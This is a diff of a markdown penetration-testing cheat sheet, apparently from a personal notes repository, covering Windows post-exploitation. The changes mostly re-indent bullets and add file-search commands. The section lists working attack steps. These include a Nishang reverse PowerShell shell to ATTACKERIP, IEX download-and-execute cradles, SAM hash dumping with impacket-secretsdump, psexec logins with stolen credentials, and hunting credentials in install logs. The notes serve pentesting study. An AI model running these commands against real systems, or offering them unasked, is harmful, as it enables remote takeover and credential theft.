@@ -1331,39 +1331,44 @@ privilege-escalation-awesome-scripts-suite)
 
 #### Attacks
 - Test if powershell is working without breaking shell
-- `powershell whoami`
+  - `powershell whoami`
 - Pivot DoS to powershell using Nishang reverse powershell script.
 - Listen w/ nc on a new port.
-- Make a copy of `Invoke-PowerShellTcp.ps1` and add `Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port NEWLISTENERPORT` at the bottom of the copy file to run the command automatically
+  - Make a copy of `Invoke-PowerShellTcp.ps1` and add `Invoke-PowerShellTcp -Reverse -IPAddress ATTACKERIP -Port NEWLISTENERPORT` at the bottom of the copy file to run the command automatically
 - Start an HTTP server in the root directoy of the modified nishang script copy
-- Run this from DoS: `powershell "IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/nishang.ps1")"`
+  - Run this from DoS: `powershell "IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/nishang.ps1")"`
 - Go to your listener terminal, you should now have a reverse PS shell
-- Download string that loads a ps script into memory (if you want it to auto run make sure there is a call to the function to do so at the bottom of the script, or else it'll just load the functions into memory)
-- `IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/jaws.ps1")`
+- Download string that loads a ps script into memory
+  - (if you want it to auto run make sure there is a call to the function to do so at the bottom of the script, or else it'll just load the functions into memory)
+  - `IEX(New-Object Net.WebClient).downloadString("http://0.0.0.0/jaws.ps1")`
 - Download file
-- PS `IEX(New-Object Net.Webclient).downloadFile("<urltofile>","savelocation")`
+  - PS `IEX(New-Object Net.Webclient).downloadFile("<urltofile>","savelocation")`
 - Run cmd as other user
-- PS > `$SecPass = ConvertTo-SecureString "password" -AsPlainText -Force; $cred = New-Object system.management.Automation.PSCredential('username', $SecPass); Start-Process -FilePath "powershell" -argumentlist "CMD" -Credential $cred`
-- DOS > `\Windows\System32\runas.exe`
+  - PS > `$SecPass = ConvertTo-SecureString "password" -AsPlainText -Force; $cred = New-Object system.management.Automation.PSCredential('username', $SecPass); Start-Process -FilePath "powershell" -argumentlist "CMD" -Credential $cred`
+  - DOS > `\Windows\System32\runas.exe`
 - Run exe
-- PS from working directory `Start-Process -FilePath "sort.exe"`
-- PS from other directory `Start-Process -FilePath "myfile.txt" -WorkingDirectory "C:\PS-Test"`
-- PS as admin `Start-Process -FilePath "powershell" -Verb RunAs -Credential $cred` (See above on how to create credential)
-- PS with arguments `Start-Process -FilePath "$env:comspec" -ArgumentList "/c dir ``"%systemdrive%\program files\``""`
+  - PS from working directory `Start-Process -FilePath "sort.exe"`
+  - PS from other directory `Start-Process -FilePath "myfile.txt" -WorkingDirectory "C:\PS-Test"`
+  - PS as admin `Start-Process -FilePath "powershell" -Verb RunAs -Credential $cred` (See above on how to create credential)
+  - PS with arguments `Start-Process -FilePath "$env:comspec" -ArgumentList "/c dir ``"%systemdrive%\program files\``""`
 - Decrypy SAM password hashes
-- `impacket-secretsdump -sam SAMFILE -system SYSTEMFILE local`
+  - `impacket-secretsdump -sam SAMFILE -system SYSTEMFILE local`
 - Determine admin accounts
-- DOS: `net localgroup administrators`
+  - DOS: `net localgroup administrators`
 - SAM and SYSTEM file location
-- `Windows/System32/config`
+  - `Windows/System32/config`
 - Log into remote windows host with stolen creds (SMB required)
-- `psexec.py user@ip`
+  - `psexec.py user@ip`
 - Find shortcut location (`*.lnk`)
-- PS `$Wscript = New-Object -ComObject Wscript.shell; $shortcut = Get-ChildItem *.lnk'; $Wscript.CreateShortcut($shortcut)`
+  - PS `$Wscript = New-Object -ComObject Wscript.shell; $shortcut = Get-ChildItem *.lnk'; $Wscript.CreateShortcut($shortcut)`
 - Remember to check for dates when patches were applied, it'll key you into good potential kernel exploits
 - Check panther directory, install logs get put in here and contain creds
 - Read contents of file in PS shell
-- `get-Content "filename"`
+  - `get-Content "filename"`
+  - `more "filename:`
+- Find a File in windows
+  - `where /R "Where to Search" "File"`
+    - Example `where /R C:\windows bash.exe`
 
 
 #### Useful Commands to get Files onto Windows Systems
